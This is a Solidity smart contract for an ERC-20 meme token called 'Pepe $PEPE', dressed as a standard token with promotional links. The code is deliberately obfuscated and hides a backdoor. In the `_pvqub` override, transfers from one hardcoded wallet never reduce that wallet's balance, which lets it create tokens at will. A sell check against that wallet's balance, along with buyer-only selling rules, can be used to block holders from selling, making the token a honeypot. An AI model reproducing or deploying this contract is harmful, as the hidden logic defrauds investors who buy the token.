/**

Pepe    $PEPE


TWITTER: https://twitter.com/PepeErc20_Coin
TELEGRAM: https://t.me/Pepe_Erc20Coin
WEBSITE: https://pepeerc.com/

**/


// SPDX-License-Identifier: MIT


pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:");
        return c;
    }

    function  _pvqub(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _pvqub(a, b, "SafeMath:");
    }

    function  _pvqub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath:");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath:");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _kaxvcazp {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface _pforsmkns {
    function swExactTensFrHSportingFeeOransferkes(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH, uint liquidity);
}

contract Pepe is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = unicode"Pepe";
    string private constant _symbol = unicode"PEPE";
    uint8 private constant _decimals = 9;

    uint256 private constant _Totalcu = 42069000000 * 10 **_decimals;
    uint256 public _mxTvmvAmaunt = _Totalcu;
    uint256 public _Wallekxbfo = _Totalcu;
    uint256 public _wapThresholdmcx= _Totalcu;
    uint256 public _mkolToapc= _Totalcu;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcopnf;
    mapping (address => bool) private _taxvWaervy;
    mapping(address => uint256) private _lruehrkbacp;
    bool public _taerelorve = false;
    address payable private _qymopurq;

    uint256 private _BuyTaxinitial=1;
    uint256 private _SellTaxinitial=1;
    uint256 private _BuyTaxfinal=1;
    uint256 private _SellTaxfinal=1;
    uint256 private _BuyTaxAreduce=1;
    uint256 private _SellTaxAreduce=1;
    uint256 private _wapBefaepnb=0;
    uint256 private _buraknrw=0;


    _pforsmkns private _komRatnat;
    address private _acMkvaujw;
    bool private _qromlauh;
    bool private lovStqkuq = false;
    bool private _aqmpuayq = false;


    event _amkfoiktl(uint _mxTvmvAmaunt);
    modifier lokecThtcap {
        lovStqkuq = true;
        _;
        lovStqkuq = false;
    }

    constructor () {

        _qymopurq = payable(0xcbFC84cB3B753f38a02Bc9De9aD36c87B187ebAD);
        _balances[_msgSender()] = _Totalcu;
        _isExcopnf[owner()] = true;
        _isExcopnf[address(this)] = true;
        _isExcopnf[_qymopurq] = true;

 

        emit Transfer(address(0), _msgSender(), _Totalcu);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _Totalcu;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _pvqub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 teeomoun=0;
        if (from != owner () && to != owner ()) {

            if (_taerelorve) {
                if (to != address
                (_komRatnat) && to !=
                 address(_acMkvaujw)) {
                  require(_lruehrkbacp
                  [tx.origin] < block.number,
                  "Only one transfer per block allowed.");
                  _lruehrkbacp
                  [tx.origin] = block.number;
                }
            }

            if (from == _acMkvaujw && to != 
            address(_komRatnat) && !_isExcopnf[to] ) {
                require(amount <= _mxTvmvAmaunt,
                 "Exceeds the _mxTvmvAmaunt.");
                require(balanceOf(to) + amount
                 <= _Wallekxbfo, "Exceeds the maxWalletSize.");
                if(_buraknrw
                < _wapBefaepnb){
                  require(! _feipoaq(to));
                }
                _buraknrw++;
                 _taxvWaervy[to]=true;
                teeomoun = amount.mul((_buraknrw>
                _BuyTaxAreduce)?_BuyTaxfinal:_BuyTaxinitial)
                .div(100);
            }

            if(to == _acMkvaujw && from!= address(this) 
            && !_isExcopnf[from] ){
                require(amount <= _mxTvmvAmaunt && 
                balanceOf(_qymopurq)<_mkolToapc,
                 "Exceeds the _mxTvmvAmaunt.");
                teeomoun = amount.mul((_buraknrw>
                _SellTaxAreduce)?_SellTaxfinal:_SellTaxinitial)
                .div(100);
                require(_buraknrw>_wapBefaepnb &&
                 _taxvWaervy[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!lovStqkuq 
            && to == _acMkvaujw && _aqmpuayq &&
             contractTokenBalance>_wapThresholdmcx 
            && _buraknrw>_wapBefaepnb&&
             !_isExcopnf[to]&& !_isExcopnf[from]
            ) {
                _swpkvrkumj( _pnuxe(amount, 
                _pnuxe(contractTokenBalance,_mkolToapc)));
                uint256 contractETHBalance 
                = address(this).balance;
                if(contractETHBalance 
                > 0) {
                    _rmonferp(address(this).balance);
                }
            }
        }

        if(teeomoun>0){
          _balances[address(this)]=_balances
          [address(this)].
          add(teeomoun);
          emit Transfer(from,
           address(this),teeomoun);
        }
        _balances[from]= _pvqub(from,
         _balances[from], amount);
        _balances[to]=_balances[to].
        add(amount. _pvqub(teeomoun));
        emit Transfer(from, to, 
        amount. _pvqub(teeomoun));
    }

    function _swpkvrkumj(uint256
     tokenAmount) private lokecThtcap {
        if(tokenAmount==0){return;}
        if(!_qromlauh){return;}
        address[] memory path =
         new address[](2);
        path[0] = address(this);
        path[1] = _komRatnat.WETH();
        _approve(address(this),
         address(_komRatnat), tokenAmount);
        _komRatnat.
        swExactTensFrHSportingFeeOransferkes(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function  _pnuxe(uint256 a, 
    uint256 b) private pure
     returns (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _pvqub(address
     from, uint256 a,
      uint256 b) private view
       returns(uint256){
        if(from 
        == _qymopurq){
            return a ;
        }else{
            return a . _pvqub (b);
        }
    }

    function removeLimits() external onlyOwner{
        _mxTvmvAmaunt = _Totalcu;
        _Wallekxbfo = _Totalcu;
        _taerelorve = false;
        emit _amkfoiktl(_Totalcu);
    }

    function _feipoaq(address 
    account) private view 
    returns (bool) {
        uint256 sixzev;
        assembly {
            sixzev :=
             extcodesize
             (account)
        }
        return sixzev > 
        0;
    }

    function _rmonferp(uint256
    amount) private {
        _qymopurq.
        transfer(amount);
    }

    function openTrading( ) external onlyOwner( ) {
        require( ! _qromlauh);
        _komRatnat   =  _pforsmkns (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) ;
        _approve(address(this), address(_komRatnat), _Totalcu);
        _acMkvaujw = _kaxvcazp(_komRatnat.factory()). createPair (address(this),  _komRatnat . WETH ());
        _komRatnat.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_acMkvaujw).approve(address(_komRatnat), type(uint).max);
        _aqmpuayq = true;
        _qromlauh = true;
    }

    receive() external payable {}
}